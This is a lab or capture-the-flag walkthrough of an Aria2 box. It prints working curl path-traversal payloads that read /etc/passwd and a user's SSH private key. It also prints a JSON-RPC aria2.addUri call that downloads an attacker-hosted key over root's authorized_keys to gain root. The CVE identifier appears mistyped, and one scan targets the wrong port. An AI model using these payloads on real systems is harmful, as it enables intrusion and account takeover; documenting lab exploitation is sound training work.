Performing an aggressive TCP port scan against the two ports using the command sudo nmap -sV -A 192.168.146.100 -p 22,8888 returns the output shown above. The application on port 8888 seems to be a web application. The scan identified the application name is Aria2 WebUI.

Enumeration & Exploitation

Port 8888: Aria2 WebUI

The webpage above is returned for this web application. I pressed the Settings button and then the Server Info, but I was unable to identify the application version. I viewed the source-code of the web application, but I did not find anything. I did a directory search and identified the file app.js, but most of the JavaScript was obfuscated. Time to try harder.


I did a Google search for aria2 webui exploits and identified the webpage shown in the image above. This webpage can be accesed here. Apparently Aria2 WebUI has a path traversal vulnerability. Since I did not identify the application version on the target machine, I attempted to leverage this exploit.


I searched for public PoC for this vulnerability and obtained the PoC shown in the image above. This PoC can be accessed here. This vulnerability lies in the application accepting file name directly from the URL input. The user input is not sanitised causing it to make vulnerable. The PoC is simple:

curl --path-as-is http://localhost:8888/../../../../../../../../../../../../../../../../../../../../etc/passwd
curl --path-as-is http://localhost:8888/../../../../../../../../../../../../../../../../../../../../etc/passwd

Exploitation: Directory Traversal (CVE-2023-391411) and SSH Key Access via Directory Traversal


Using the payload curl --path-as-is http://192.168.146.100:8888/../../../../../../../../../../../../../../../../../../../../etc/passwd, I made a request to access the /etc/passwd file and got a hit as shown in the image above. It seems like the web application is vulnerable to the directory traversal attack (CVE-2023-391411). There is one user called deathflash on the target machine. Usually with directory traversal attacks, the next step is to attempt to read sensitive files such as SSH keys of the users on the machine.


Using the payload curl --path-as-is http://192.168.146.100:8888/../../../../../../../../../../../../../../../../../../../../home/deathflash/.ssh/id_rsa, I made a request to access the SSH key of the user deathflash and got a hit. I was able to read their SSH key. I copied this SSH key to my machine.


I changed the permission of the SSH key to make it private by using the command chmod 400 id_rsa. Then I successfully connected to the remote target machine via SSH key of deathflash as shown in the image above. Now I have a foothold on the target machine as the user deathflash.

Privilege Escalation

Vertical Privilege Escalation: user deathflash to user root via SSH Key Overwrite Using aria2 json rpc


I spent a huge amount of time performing enumeration. I could not find anything. However, when I ran LinPeas on the target machine I obtained the crucial information shown above. The aria2c seems to be operating with root context by sending some sort of secret. I Googled further about this application and identified the same application can work on port 6800 using RPC.


The secret is stored inside the /etc/systemd/system/aria2.service file, as shown in the picture above. The secret is mEHNghqcNiF3KV. Since I have the secret of the root user for this application, I can attempt to make RPC calls via JSON.


I ran the command netstat -anto first and identified the application is working on port 6800. However, this port is not exposed to the public network. SInce I have SSH access on the target machine as the user deathflash, I can expose this port to my attack machine via SSH Local Port Forwarding. To setup the forwarding, I ran the command ssh -L 6800:localhost:6800 deathflash@192.168.111.100 -i id_rsa. With this setup, I was able to run the command sudo nmap -sV -A localhost -p 8443 to perform the scan. From the scan, it identified the application name is aria2 downloader json-rpc.

I had to reset the box as my VPN was having issues. The new IP of the target machine is 192.168.111.100. I setup the port forwading again but to the port 6800 on my localhost. Then I performed further research on how to use this application and came across this post. Since the target machine is Linux, I found the payload on the post:

curl http://localhost:6800/jsonrpc -d "{\"jsonrcp\":\"2.0\",\"id\":\"someID\",\"method\":\"aria2.addUri\",\"params\":[\"token:ariatest\",[\"http://m.gettywallpapers.com/wp-content/uploads/2020/01/Wallpaper-Naruto-2.jpg\"],{\"out\":\"test.jpg\"}]}"
curl http://localhost:6800/jsonrpc -d "{\"jsonrcp\":\"2.0\",\"id\":\"someID\",\"method\":\"aria2.addUri\",\"params\":[\"token:ariatest\",[\"http://m.gettywallpapers.com/wp-content/uploads/2020/01/Wallpaper-Naruto-2.jpg\"],{\"out\":\"test.jpg\"}]}"


Since I have the root secret and can overwrite files on the target machine, I can attempt to overwrite the authorized_keys of the user root. I ran the command ssh-keygen to generate a SSH keypair on my machine, which I will use to overwrite the key of the user root.


From the previous post, I modified the payload to overwrite the key with the secret belonging to the user root to the following:

curl http://localhost:6800/jsonrpc -d "{\"jsonrcp\":\"2.0\",\"id\":\"someID\",\"method\":\"aria2.addUri\",\"params\":[\"token:mEHNghqcNiF3KV\",[\"http://192.168.45.232:8080/root.pub\"],{\"out\":\"/root/.ssh/authorized_keys\"}]}"
curl http://localhost:6800/jsonrpc -d "{\"jsonrcp\":\"2.0\",\"id\":\"someID\",\"method\":\"aria2.addUri\",\"params\":[\"token:mEHNghqcNiF3KV\",[\"http://192.168.45.232:8080/root.pub\"],{\"out\":\"/root/.ssh/authorized_keys\"}]}"

In the image above, the first attempt failed as I forgot to insert the secret of the user root. I inserted the secret of the user root and made the call again and got a hit. I changed the permission of the newly generated SSH key to private using the command chmod 400 root.


Then using the command ssh root@192.168.111.100 -i root, I was able to login to the target machine as the user root. Now I have root privileges.

Flags


The two flags, proof.txt and local.txt, are shown in the image above.
